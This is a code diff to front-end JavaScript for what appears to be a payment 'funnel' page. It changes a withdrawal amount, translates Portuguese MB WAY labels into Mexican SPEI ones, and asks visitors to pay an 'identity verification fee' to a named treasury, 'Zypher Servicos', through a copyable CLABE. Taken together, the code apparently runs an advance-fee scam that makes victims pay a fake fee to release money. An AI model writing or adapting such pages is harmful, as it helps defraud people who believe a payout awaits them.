@@ -71,7 +71,7 @@
     window.CENTRAL_PRICES = Object.assign({}, window.CENTRAL_PRICES || {}, priceMap);
     window.__FUNIL_FEE_FRONT = priceMap.front;
     window.__FUNIL_FEE_BACK = priceMap.back;
-    window.__FUNIL_AMOUNT_SAQUE_1 = 58800;
+    window.__FUNIL_AMOUNT_SAQUE_1 = 32800;
     window.getCentralPrice = function (key, fallback) {
       return Object.prototype.hasOwnProperty.call(priceMap, key) ? priceMap[key] : fallback;
     };
@@ -87,7 +87,7 @@
     try {
       sessionStorage.setItem('ttk_preserved_query', 'mx_lab=1');
       sessionStorage.setItem('ttk_confirmar_state', JSON.stringify({
-        amount: '58800',
+        amount: '32800',
         MBWAYKeyType: 'spei',
         MBWAYKey: 'CLABE',
         customerData: { name: '', method: 'spei' }
@@ -682,7 +682,7 @@
       if (text === 'PAGA POR SPEI' || text === 'PAGUE POR SPEI') el.textContent = 'Pagar mediante SPEI';
       if (text === 'PAGA POR' || text === 'PAGUE POR') el.textContent = 'Pague la tarifa de verificación de identidad';
       if (text === 'Paga por SPEI' || text === 'Pague por SPEI') el.textContent = 'Pagar mediante SPEI';
-      if (text === 'Entidade:' || text === 'Banco:') el.textContent = 'Método de pago:';
+      if (text === 'Entidade:' || text === 'Banco:') el.textContent = 'Banco:';
       if (text === 'Referência:') el.textContent = 'Referencia:';
       if (text === 'Aguardando pagamento...') el.textContent = 'Esperando pago...';
     });
@@ -865,7 +865,7 @@
     var paymentCard = heading;
     while (paymentCard && paymentCard !== document.body) {
       var cardText = (paymentCard.textContent || '').replace(/\s+/g, ' ');
-      if (/Banco:/i.test(cardText) && /Referencia:/i.test(cardText)) break;
+      if (/(?:Banco|Método de pago):/i.test(cardText) && /Referencia:/i.test(cardText)) break;
       paymentCard = paymentCard.parentElement;
     }
     if (!paymentCard || paymentCard === document.body) {
@@ -880,7 +880,7 @@
     var reference = getCurrentSpeiReference();
     var referenceBox = Array.prototype.filter.call(paymentCard.querySelectorAll('div'), function (el) {
       var text = (el.textContent || '').replace(/\s+/g, ' ');
-      return /Banco:/i.test(text) && /Referencia:/i.test(text);
+      return /(?:Banco|Método de pago):/i.test(text) && /Referencia:/i.test(text);
     }).sort(function (a, b) {
       return (a.textContent || '').length - (b.textContent || '').length;
     })[0] || null;
@@ -888,15 +888,19 @@
     if (!reference && referenceBox) reference = extractSpeiReference(referenceBox.textContent || '');
     if (reference) rememberSpeiReference(reference);
     if (referenceBox) referenceBox.classList.add('mx-lab-reference-box');
-    if (referenceBox && referenceBox.textContent && /Banco:|Referencia:/i.test(referenceBox.textContent)) {
-      var bankName = 'SPEI';
+    if (referenceBox && referenceBox.textContent && /(?:Banco|Método de pago):|Referencia:/i.test(referenceBox.textContent)) {
+      var bankName = 'Finco Pay';
       referenceBox.innerHTML =
         '<div style="display:flex;align-items:center;justify-content:flex-start;gap:6px;margin-bottom:12px">' +
         '<span style="color:#64748b;font-size:16px;line-height:1.25">Banco:</span>' +
         '<strong style="color:#0f172a;font-size:15px;line-height:1.25;text-align:left;overflow-wrap:anywhere">' + escapeHtml(bankName) + '</strong>' +
         '</div>' +
+        '<div style="display:flex;align-items:center;justify-content:flex-start;gap:6px;margin-bottom:12px">' +
+        '<span style="color:#64748b;font-size:16px;line-height:1.25">Tesorería:</span>' +
+        '<strong style="color:#0f172a;font-size:15px;line-height:1.25;text-align:left;overflow-wrap:anywhere">Zypher Servicos</strong>' +
+        '</div>' +
         '<div style="display:block">' +
-        '<span style="display:block;color:#64748b;font-size:16px;line-height:1.25;margin-bottom:4px">Referencia:</span>' +
+        '<span style="display:block;color:#64748b;font-size:16px;line-height:1.25;margin-bottom:4px">CLABE:</span>' +
         '<strong class="mx-lab-reference-text" style="color:#0f172a;font-size:15px;line-height:1.3">' + escapeHtml(reference) + '</strong>' +
         '</div>';
     }
@@ -908,7 +912,7 @@
       copyButton.classList.add('mx-lab-copy-reference-btn');
       copyButton.setAttribute('data-mx-lab-copy', '1');
       copyButton.setAttribute('data-mx-lab-reference', reference);
-      copyButton.textContent = 'Copiar referencia SPEI';
+      copyButton.textContent = 'Copiar CLABE';
       referenceBox.insertAdjacentElement('afterend', copyButton);
     }
     document.querySelectorAll('button').forEach(function (button) {
